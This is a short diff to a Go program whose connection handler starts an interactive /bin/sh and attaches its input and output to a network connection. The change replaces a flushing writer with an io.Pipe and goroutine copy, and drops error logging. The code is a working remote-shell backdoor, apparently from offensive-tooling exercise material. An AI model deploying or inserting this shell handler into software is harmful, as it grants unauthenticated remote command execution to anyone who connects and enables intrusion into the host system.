@@ -3,7 +3,6 @@ package main
 import (
 	"bufio"
 	"io"
-	"log"
 	"net"
 	"os/exec"
 )
@@ -255,18 +254,17 @@ func handler(conn net.Conn) {
 	// the first param is the cmd and the the second param is the argument
 	cmd := exec.Command("/bin/sh", "-i")
 
+	rp, wp := io.Pipe()
+
 	// Set stdin to our connection
 	cmd.Stdin = conn
-
 	// Create a Flusher from the connection to use for stdout.
 	// This ensures stdout is flushed adequately and sent via net.Conn.
 
-	cmd.Stdout = NewFlusher(conn)
+	cmd.Stdout = wp
 
-	// Run the command.
-
-	if err := cmd.Run(); err != nil {
-		log.Fatalln(err)
-	}
+	go io.Copy(conn, rp)
+	cmd.Run()
+	conn.Close()
 
 }
